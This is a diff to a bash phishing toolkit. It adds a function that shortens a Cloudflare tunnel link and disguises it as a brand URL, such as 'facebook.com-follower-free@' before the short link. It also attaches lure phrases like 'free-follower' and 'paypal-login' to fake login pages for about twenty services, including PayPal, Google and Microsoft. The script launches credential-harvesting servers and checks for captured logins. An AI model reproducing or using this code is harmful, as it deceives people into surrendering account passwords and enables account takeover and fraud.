@@ -42,6 +42,14 @@ check_cred(){
 	done
 }
 #End of user cred-------------------
+# make a function to mask the url (crdit this function is inspired from jaykali maskphish )
+mask(){
+	shorturl=$(curl -s "https://is.gd/create.php?format=simple&url=$3")
+	short=${shorturl#https://}
+	maskurl=https://$1.com-$2@${short}
+	echo -ne "\e[31;1m[~] Mask url: "
+	echo -e "\e[32;1m $maskurl"
+}
 #make a function to download the cloudflare 
 # now start the cloudflare
 start_cloud(){
@@ -62,7 +70,9 @@ start_cloud(){
     clear
     banner
     echo -ne "\e[36;1m Link: "
-    cat .pk.txt | grep "trycloudflare" | cut -d "|" -f2 | cut -d "}" -f2 
+	link=$(cat .pk.txt | grep "trycloudflare" | cut -d "|" -f2 | cut -d "}" -f2)
+    cat .pk.txt | grep "trycloudflare" | cut -d "|" -f2 | cut -d "}" -f2
+	mask $1 $2 $link
 	check_cred $1
 }
 #make a function to download the cloudflared 
@@ -190,7 +200,7 @@ server(){
 		echo -e "\n"
 		echo -e "${w}[${r}+${w}] ${g} Starting clouflare "
 	    check_platform
-		start_cloud $1
+		start_cloud $1 $2
 	else 
 		echo -e "\n"
 		echo -e "${r} Invalid option."
@@ -310,89 +320,89 @@ case $optn in
 	01 | 1)
 		echo " " 
 		echo -ne "${w}[${g}+${w}] ${y} Starting facebook server"
-		server facebook ;;
+		server "facebook" "follower-free" ;;
 	2 | 02)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting instagram server"
-		server instagram ;;
+		server "instagram" "free-follower" ;;
 	3 | 03)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting Snapchat server"
-		server snapchat;;
+		server "snapchat" "new-friend";;
 	4 | 04)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting google server"
-		server google;;
+		server "google" "google-login";;
 
 	5 | 05)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting github server"
-		server github;;
+		server "github" "free-stars";;
 
 	6 | 06)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting Paypal server"
-		server paypal;;
+		server "paypal" "paypal-login";;
 
 	7 | 07)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting Spotify server"
-		server spotify;;
+		server "spotify" "free-premimum-account";;
 
 	8 | 08)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting microsoft server"
-		server microsoft;;
+		server "microsoft" "free-purchage-key";;
 
 	9 | 09)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting linkedin server"
-		server linkedin;;
+		server "linkedin" "new-job";;
 
 	10)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting adobe server"
-		server adobe;;
+		server "adobe" "adobe-account";;
 
 	11)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting netflix server"
-		server netflix;;
+		server "netflix" "premimum-account-free";;
 
 	12)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting twitter server"
-		server twitter;;
+		server "twitter" "free-follower";;
 
 	13)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting dropbox server"
-		server dropbox;;
+		server "dropbox" "download";;
 
 	14)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting fake instagram follower server"
-		server ig_follower;;
+		server "ig_follower" "free-follower-new";;
 	15)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting yandex server"
-		server yandex;;
+		server "yandex" "yandex-account";;
 	16)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting origin server"
-		server origin;;
+		server "origin" "login";;
 	17)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting ebay server"
-		server ebay;;
+		server "ebay" "free-account";;
 	18)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting pinterest server"
-		server pinterest;;
+		server "pinterest" "free-follower";;
 	19)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y} Starting yahoo server"
-		server yahoo;;
+		server "yahoo" "yahoo-account";;
 	20)
 		echo " "
                 echo -ne "${w}[${g}+${w}] ${y}  Please wait"
